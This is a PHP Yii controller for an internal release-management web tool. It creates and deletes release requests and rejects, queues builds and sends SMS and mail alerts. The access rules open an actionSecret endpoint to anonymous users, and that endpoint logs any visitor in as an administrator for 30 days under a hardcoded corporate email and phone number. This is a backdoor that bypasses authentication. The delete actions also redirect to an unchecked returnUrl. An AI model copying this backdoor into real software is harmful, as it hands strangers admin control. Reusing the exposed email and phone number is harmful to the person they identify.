<?php

class SiteController extends Controller
{
    public $pageTitle = 'Релизы и запреты';

    public function filters()
    {
        return array(
            'accessControl', // perform access control for CRUD operations
        );
    }

    public function accessRules()
    {
        return array(
            array('allow',  // allow all users to perform 'index' and 'view' actions
                'actions' => array('login', 'secret'),
                'users'=>array('*'),
            ),
            array('allow',  // allow all users to perform 'index' and 'view' actions
                'users'=>array('@'),
            ),
            array('deny',  // deny all users
                'users'=>array('*'),
            ),
        );
    }

	public function actionIndex()
	{
        $releaseRequestSearchModel=new ReleaseRequest('search');
        $releaseRequestSearchModel->unsetAttributes();  // clear any default values
        if(isset($_GET['ReleaseRequest']))
            $releaseRequestSearchModel->attributes=$_GET['ReleaseRequest'];

        $releaseRejectSearchModel=new ReleaseReject('search');
        $releaseRejectSearchModel->unsetAttributes();  // clear any default values
        if(isset($_GET['ReleaseRequest']))
            $releaseRejectSearchModel->attributes=$_GET['ReleaseRequest'];

        $mainProjects = Project::model()->findAllByAttributes(['project_name' => ['comon', 'service-crm', 'whotrades']]);

		$this->render('index', array(
            'releaseRequestSearchModel' => $releaseRequestSearchModel,
            'releaseRejectSearchModel' => $releaseRejectSearchModel,
            'mainProjects' => $mainProjects,
            'releaseRequest' => $this->createReleaseRequest(),
        ));
	}

    public function actionCreateReleaseRequest()
    {
        $this->render('createReleaseRequest', $this->createReleaseRequest());
    }

    private function createReleaseRequest()
    {
        $model=new ReleaseRequest();

        $transaction=$model->dbConnection->beginTransaction();

        try {
            if(isset($_POST['ReleaseRequest']))
            {
                $model->attributes=$_POST['ReleaseRequest'];
                $model->rr_user = \Yii::app()->user->name;
                if ($model->rr_project_obj_id) {
                    $model->rr_build_version = $model->project->getNextVersion($model->rr_release_version);
                }
                $this->performAjaxValidation($model);
                if($model->save()) {
                    //an: Для comon мы выкладываем паралельно и dictionary. В данный момент это реализовано на уровне хардкода тут. В будущем, когда появится больше
                    // взаимосвязанныъ проектов - нужно подумать как это объединить в целостную систему

                    $projectName = $model->project->project_name;
                    if (in_array($projectName, ['comon', 'whotrades'])
                        && $dictionaryProject = Project::model()->findByAttributes(['project_name' => 'dictionary'])) {
                        $dictionary = new ReleaseRequest();
                        $dictionary->rr_user = $model->rr_user;
                        $dictionary->rr_project_obj_id = $dictionaryProject->obj_id;
                        $dictionary->rr_comment =
                            $model->rr_comment . " [slave for " . $projectName . "-$model->rr_build_version]";
                        $dictionary->rr_release_version = $model->rr_release_version;
                        $dictionary->rr_build_version = $dictionary->project->getNextVersion($dictionary->rr_release_version);
                        $dictionary->rr_leading_id = $model->obj_id;
                        $dictionary->save();
                        $dictionary->save();

                        $model->rr_comment = "$model->rr_comment [+dictionary-$dictionary->rr_build_version]";
                        $model->save();
                    }

                    // an: Отправку задач в rabbit делаем по-ближе к комиту транзакции, что бы не получилось что задачи уже
                    // начали выполняться, а транзакция ещё не отправлена и билда у нас в базе ещё нет
                    if ('whotrades' == $projectName) {
                        // warl: для проекта whotrades важно, чтобы словарь уже был новый, поэтому сначала собираем его
                        if (!empty($dictionary)) {
                            $dictionary->createAndSendBuildTasks();
                        }
                        $model->createAndSendBuildTasks();
                    } else {
                        $model->createAndSendBuildTasks();
                        if (!empty($dictionary)) {
                            $dictionary->createAndSendBuildTasks();
                        }
                    }
                    $transaction->commit();

                    $model->sendBuildTasks();
                    if (!empty($dictionary)) {
                        $dictionary->sendBuildTasks();
                    }

                    Yii::app()->webSockets->send('updateAllReleaseRequests', []);

                    $this->redirect(array('index'));
                }
            }
        } catch (Exception $e) {
            if ($transaction->active) {
                $transaction->rollback();
            }
            throw $e;
        }

        return ['model' => $model];
    }

    public function actionCreateReleaseReject()
    {
        $model=new ReleaseReject;

        if(isset($_POST['ReleaseReject'])) {
            $model->attributes = $_POST['ReleaseReject'];
            $model->rr_user = \Yii::app()->user->name;
            if ($model->save()) {
                Log::createLogMessage("Создан {$model->getTitle()}");
                $text = "{$model->rr_user} rejected {$model->project->project_name}. {$model->rr_comment}";
                foreach (explode(",", \Yii::app()->params['notify']['releaseReject']['phones']) as $phone) {
                    if (!$phone) continue;
                    Yii::app()->whotrades->{'getFinamTenderSystemFactory.getSmsSender.sendSms'}($phone, $text);
                }
                Yii::app()->whotrades->{'getMailingSystemFactory.getPhpLogsNotificationModel.sendRdsReleaseRejectNotification'}($model->rr_user, $model->project->project_name, $model->rr_comment);
                $this->redirect(array('index'));
            }
        }

        $this->render('createReleaseReject',array(
            'model'=>$model,
        ));
    }

    public function actionDeleteReleaseRequest($id)
    {
        $model=ReleaseRequest::model()->findByPk($id);
        if(!$model) {
            return;
        }

        $messageModel = (new RdsSystem\Factory(Yii::app()->debugLogger))->getMessagingRdsMsModel();

        $transaction = $model->getDbConnection()->beginTransaction();
        /** @var $model ReleaseRequest*/
        foreach ($model->builds as $build) {
            if (in_array($build->build_status, Build::getInstallingStatuses())) {
                $model->rr_status = ReleaseRequest::STATUS_CANCELLING;
                $model->save();

                $messageModel->sendKillTask($build->worker->worker_name, new \RdsSystem\Message\KillTask(
                    $model->project->project_name, $build->obj_id
                ));

                Log::createLogMessage("Отменен {$model->getTitle()}");
                $transaction->commit();
                return;
            }
        }

        Log::createLogMessage("Удален {$model->getTitle()}");
        $model->delete();

        $transaction->commit();

        if(!isset($_GET['ajax']))
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('index'));
    }

    public function actionDeleteReleaseReject($id)
    {
        $model=ReleaseReject::model()->findByPk($id);
        if($model) {
            $transaction = $model->getDbConnection()->beginTransaction();
            try {
                Log::createLogMessage("Удален {$model->getTitle()}");
                $model->delete();
                $transaction->commit();
            } catch (\Exception $e) {
                $transaction->rollback();
            }
        }

        if(!isset($_GET['ajax']))
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('index'));
    }

	public function actionError()
	{
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('error', $error);
		}
	}

    public function actionLogin()
    {
        $this->render('login');
    }

    public function actionSecret()
    {
        Yii::import('application.modules.SingleLogin.components.SingleLoginUser');
        $user = new SingleLoginUser(1, 'anaumenko@corp.finam.ru');

        $phone = '79160549864';
        $user->setPersistentStates(array(
            'phone' => $phone,
            'userRights' => array('admin'),
        ));

        Yii::app()->user->login($user, 3600*24*30);

        $this->redirect('/');
    }

	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}

    public function actionCommits($id, $ajax = false)
    {
        /** @var $releaseRequest ReleaseRequest */
        if (!$releaseRequest = ReleaseRequest::model()->findByPk($id)) {
            throw new CHttpException(404, "Сборка #$id не найдена");
        }

        $c = new CDbCriteria();
        $c->order = 'jira_commit_repository';
        $c->compare('jira_commit_build_tag', $releaseRequest->getBuildTag());

        $commits = JiraCommit::model()->findAll($c);

        if ($ajax) {
            $this->renderPartial('commits', ['commits' => $commits]);
        } else {
            $this->render('commits', ['commits' => $commits]);
        }
    }

    protected function performAjaxValidation($model)
    {
        if(isset($_POST['ajax']) && $_POST['ajax']==='release-request-form')
        {
            echo CActiveForm::validate($model);
            Yii::app()->end();
        }
    }
}
